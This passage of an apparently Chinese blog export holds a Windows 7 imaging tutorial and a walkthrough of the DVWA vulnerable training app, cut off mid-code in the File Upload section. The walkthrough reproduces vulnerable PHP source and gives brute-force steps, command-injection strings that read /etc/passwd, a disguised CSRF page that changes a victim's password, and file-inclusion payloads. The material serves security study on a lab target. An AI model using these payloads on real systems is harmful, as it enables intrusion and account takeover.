http://CentosIP/vnc.html 输入密码 网页连接成功","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"Win7系统封装与快速装机","slug":"平台/Win7系统封装","date":"2021-05-03T03:40:59.000Z","updated":"2021-07-21T11:18:11.649Z","comments":true,"path":"2021/05/03/平台/Win7系统封装/","link":"","permalink":"http://example.com/2021/05/03/%E5%B9%B3%E5%8F%B0/Win7%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/","excerpt":"","text":"# Win7 系统封装与快速装机 # 背景 最近小编接受了一项任务，给一定数量的电脑更换系统，并且需要根据实际，在系统中安装环境和许多软件，而一台一台安装又不大现实，于是就开始了这一次艰辛的历程，从开始着手到最终成功花费了近一周的空闲时间，失败次数 4 次以上，而每次尝试花费的时间都在 5 小时左右。。。 于是特地把过程记录下来，希望能帮到有需要的人，所需要的工具放在最后。 # 任务目标 给若干电脑装系统，并带有自定义的软件。采取的解决方法是制作自定义的封装系统。 # 准备工具 Win7 镜像 虚拟机环境 各类软件安装包 优化清理工具 系统封装工具 PE 启动盘一个 # 安装系统 首先在 VMware 中安装 Win7 系统，安装系统步骤省略。 安装到这个界面时停住，建立一次快照，记得每做完几步就建立快照哦。 此时注意，第一个关键点，否则将失败，这里不添加用户，按下 Ctrl+Shift+F3，系统重启，自动用 Administrator 登录。出现以下界面。 此时注意，第二个关键点，这里选择取消，并且以后的每次重启都选择取消。之后改改分辨率，将桌面图标调出来。 # 安装所需软件 接下来就是一个接一个地安装软件。U1S1，安装这些软件真太费时间了。 这里小编安装了一些语言环境和常用的软件，当然也可以结合需要安装不同软件。 # 清理优化 安装完所有需要的软件后，接下来将系统清理一下。 使用 Dism++ 等清理工具将系统运行不需要的功能和缓存清除，修改一些系统设置，清空回收站等，清理完后系统减小了约 10G 的空间。 # 封装系统 接下来到最关键的步骤了，这一步直接决定成功与否。 # 第一次封装 在做好一切准备工作后，确定这就是你想要的系统时，就可以开始封装系统了。 使用系统封装工具 EasySysprep5 对系统进行第一次封装，注意这次是在 Win7 系统中进行。 直接一键封装。封装结束后需要立即进入 PE 系统进行第二次封装。 # 第二次封装 关于 VM 中进入 PE 系统，这里有些经验分享给你。 第一步，将虚拟机关机，在虚拟机设置中添加硬盘，直到这一步。 这里选择使用物理磁盘，选择 PhysicalDrive1，我的情况是电脑只有一块硬盘，那么第二块就是 U 盘了，如果有疑惑可以打开磁盘管理查看，使用整个磁盘，添加完毕。扩展一下，这边也可以使用主机硬盘分区，就类似于共享了主机的一块分区，但是注意不能是系统分区和运行软件的分区。 开机选择打开电源进入固件，就是进入 BIOS 改变启动顺序，在 BOOT 选项中将第二块硬盘放到最上面，F10 保存重启。 进入 PE 后进行第二次封装，一键封装就行，如果没啥问题就成功了。封装完成后别重启，进行下一步系统备份。 # 制作 Ghost 镜像 使用 PE 系统的 Ghost 软件进行备份，选择 Win7 系统所在的盘，备份成为.gho 文件。 经过近一小时的等待，备份 40 多 G 的系统，得到了 17G 大小的 GHO 镜像，到这里制作自定义系统就结束了。 # 测试效果 小编在是直接在原系统上测试，进入 PE 使用分区工具将原系统分区和大约 300M 大小的引导分区格式化，再使用 Ghost 恢复分区，经过一小时的等待，恢复完成。 这时别着急重启系统，使用 DG 分区工具重建还原后的分区引导，不然可能不能正常开机哦。 成功启动。 所有环境都在，软件功能正常。 # 总结 这件看起来很简单的事，为什么花了这么久的时间？一开始呢，就想着制作 GHO 镜像，然后还原就能用，但是并非如此，其实在 CSDN 上有很成熟的教程，但是之前并不知道 “系统封装” 这个关键词，信息上的缺乏真会延误战机。不过呢，在过程中了解了许多系统相关知识，还在 U 盘里装了个 MSDOS 系统，等等收获也是不少。 最后手动 @CSDN 作者 “小鱼儿 yr” 提供的详细教程，如果觉得这篇教程不够详细，可以再看看他的。 工具链接：https://pan.baidu.com/s/1t_X6c1xftADwYN1diiRO1Q 提取码：lc7e","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"DVWA通关手册","slug":"安全/DVWA","date":"2021-04-15T03:40:59.000Z","updated":"2021-07-21T11:14:10.305Z","comments":true,"path":"2021/04/15/安全/DVWA/","link":"","permalink":"http://example.com/2021/04/15/%E5%AE%89%E5%85%A8/DVWA/","excerpt":"","text":"# DVWA 通关手册 # Brute Force 登录界面 # # Low 1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Get username $user = $_GET[ &#x27;username&#x27; ]; // Get password $pass = $_GET[ &#x27;password&#x27; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 使用 Burp Suit 抓包 Send to intruder 选择密码位置 上字典 根据返回长度判断正确密码 # Medium 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 加入了参数的判断，防止部分 SQL 注入，加入 sleep (2) 没有防爆破机制，操作同 Low 等级 # High 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 加入 Anti-CSRF token 机制，验证本次请求中是否包含上一个回应中的 token 抓包分析 Send to intruder，选择 position，两个爆破位应使用 Pitchfork 模式 option 中选择 Grep-Extract，添加回应包中的 token 值 第一个位置应用字典，第二个位置应用 grep 内容，并初始化 token 值 Start attack，一样看长度 # Command Injection 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#Command Injection#Impossible Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;#High Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;#Medium Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;#Low Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; # Low 127.0.0.1 127.0.0.1&amp;&amp; whoami 127.0.0.1&amp;&amp; pwd 127.0.0.1&amp;&amp;ls …/…/ 127.0.0.1&amp;&amp;cat …/…/php.ini 127.0.0.1&amp;&amp;cat /etc/passwd # Medium 127.0.0.1&amp; ls 127.0.0.1&amp; cat /etc/passwd # High 127.0.0.1 |ls # Cross Site Request Forgery (CSRF) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158# CSRF# Impossible CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_curr = $_GET[ &#x27;password_current&#x27; ]; $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:password&#x27;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( &#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27; ); $data-&gt;bindParam( &#x27;:password&#x27;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;# High CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;# Medium CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;# Low CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; # Low 做个网页 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;是兄弟就来砍我&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;form action=&quot;http://192.168.23.133/dvwa/vulnerabilities/csrf/&quot; method=&quot;get&quot;&gt; &lt;p&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;123&quot;/&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;123&quot;/&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;/&gt;&lt;/p&gt; &lt;input type=&quot;submit&quot; value=&quot;是兄弟就来砍我&quot;&gt; &lt;/form&gt; &lt;p style=&quot;font-size:40px;&quot;&gt;404&lt;/p&gt; &lt;p style=&quot;font-size:20px;&quot;&gt;Page not Found!&lt;/p&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 包信息 12345678910GET /dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change HTTP/1.1Host: 192.168.23.133User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeReferer: http://192.168.23.133/dvwa/vulnerabilities/csrf/Cookie: security=medium; PHPSESSID=otpvh75rdm983qnfc0scstgns0Upgrade-Insecure-Requests: 1 # Medium Low 方法失效，对比正常请求的包，发现包中添加了 1Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/ 解决方案是将 csrf 网页部署在目标服务器 IP 作为的路径下。 # High 需要配合 XSS 攻击 # File Inclusion 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//File Inclusion//Impossible File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt;//High File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt;//Medium File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt;//Low File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];?&gt; # Low GET 方法传参，直接修改网址，查看 /etc/passwd 123?page=/etc/passwdroot:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin dockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologin # Medium 过滤了 “http://”, “https://”，“…/&quot;,&quot;…\\&quot; 可以构造 &quot;httphttp://😕/&quot; 异形路径 同 Low 等级 # High 加入黑名单机制，参数只能以 file 开头 构造参数 1?page=file:///etc/passwd 使用 file 协议访问本地文件 # File Upload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159//File Upload//Impossible File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;; //$target_file = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; $target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; $temp_file = ( ( 